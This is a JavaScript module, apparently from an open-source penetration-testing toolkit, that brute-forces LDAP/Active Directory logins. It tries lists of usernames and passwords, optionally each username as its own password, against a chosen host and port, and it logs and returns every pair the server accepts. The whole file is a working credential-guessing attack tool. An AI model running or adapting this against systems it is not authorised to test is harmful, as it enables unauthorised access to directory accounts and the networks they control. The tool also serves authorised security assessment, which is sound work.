// Copyright Jesus Perez <jesusprubio gmail com>
//           Sergio Garcia <s3rgio.gr gmail com>
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

'use strict';


const ldap = require('ldapjs');
const async = require('async');

const logger = require('../utils/logger');

module.exports.help = {
  description: 'LDAP/Active Directory credentials brute force',
  options: {
    target: {
      type: 'ip',
      description: 'Host to attack',
      defaultValue: '127.0.0.1',
    },
    port: {
      type: 'port',
      description: 'Port to attack on chosen IPs',
      defaultValue: 389,
    },
    users: {
      type: 'userPass',
      description: 'Users, range (ie: range:0000-0100) or file with them to test',
      defaultValue: 'cn=admin,dc=quobislab,dc=com',
    },
    passwords: {
      type: 'userPass',
      description: 'Password (or file with them) to test',
      defaultValue: 'anonymous',
    },
    userAsPass: {
      type: 'yesNo',
      description: 'Test the same user as password for each one.',
      defaultValue: 'yes',
    },
    delay: {
      type: 'positiveInt',
      description: 'Delay between requests, in ms.',
      defaultValue: 0,
    },
    timeout: {
      type: 'positiveInt',
      description: 'Time to wait for a response, in ms.',
      defaultValue: 5000,
    },
  },
};


module.exports.run = (options, callback) => {
  const result = [];
  let indexCountUsr = 0; // Used with delay to know in which index we are
  let indexCountPass = 0;

  // We avoid to parallelize here to control the interval of the requests
  async.eachSeries(options.users, (user, asyncCbUsr) => {
    let finalPasswords = [];

    finalPasswords = finalPasswords.concat(options.passwords);
    indexCountUsr += 1;
    indexCountPass = 0;
    if (options.userAsPass) {
      finalPasswords.push(user);
    }

    async.eachSeries(finalPasswords, (password, asyncCbPass) => {
      const lpath = user.split(',').slice(1);

      function delayCb() {
        // Last element
        if (indexCountPass === finalPasswords.length &&
          indexCountUsr === options.users.length) {
          asyncCbPass();
        } else {
          setTimeout(asyncCbPass, options.delay);
        }
      }

      indexCountPass += 1;
      const client = ldap.createClient({
        url: `ldap://${options.target}:${options.port.toString()}/${lpath}`,
      });
      client.bind(user, password, err => {
        // TODO: Destroy/close client, not supported by the module
        if (!err) {
          result.push({
            user,
            pass: password,
          });
          logger.highlight(`Valid credentials found: ${user} | ${password}`);
          delayCb();
        } else if (/Invalid Credentials/.test(err)) {
          logger.infoHigh(`Valid credentials NOT found for: ${user} | ${password}`);
          delayCb();
        } else {
          asyncCbPass(err);
        }
      });
    }, err => {
      asyncCbUsr(err);
    });
  }, err => {
    callback(err, result);
  });
};
